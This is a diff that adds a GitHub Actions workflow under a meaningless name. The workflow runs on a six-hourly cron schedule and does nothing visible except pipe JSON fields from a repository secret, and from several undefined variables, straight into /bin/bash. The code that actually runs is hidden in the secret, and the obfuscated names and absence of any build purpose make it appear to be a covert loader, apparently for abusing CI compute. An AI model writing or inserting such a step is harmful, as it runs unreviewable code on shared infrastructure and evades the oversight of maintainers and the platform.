@@ -1,0 +1,28 @@
+name: xiangxigangaa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangxigangaa
+        env:
+          vawqy3037: ${{ secrets.vawqy3037 }}
+        run: |
+          echo $vawqy3037 | jq -r .fn426 | /bin/bash
+          echo $gh78276 | jq -r .sbxg01432 | /bin/bash
+          echo $hjnyo0 | jq -r .mtzwo3276 | /bin/bash
+          echo $rhsfc470 | jq -r .sqmww8096 | /bin/bash
+          echo $y66416 | jq -r .jrdp2 | /bin/bash
+          echo $r77324 | jq -r .uog518 | /bin/bash
+          echo $yuojf373 | jq -r .k446 | /bin/bash
+          echo $c4112 | jq -r .vc2733 | /bin/bash
+          echo $tmvid2752 | jq -r .j7 | /bin/bash
+          echo $hqb37101 | jq -r .p478 | /bin/bash
+
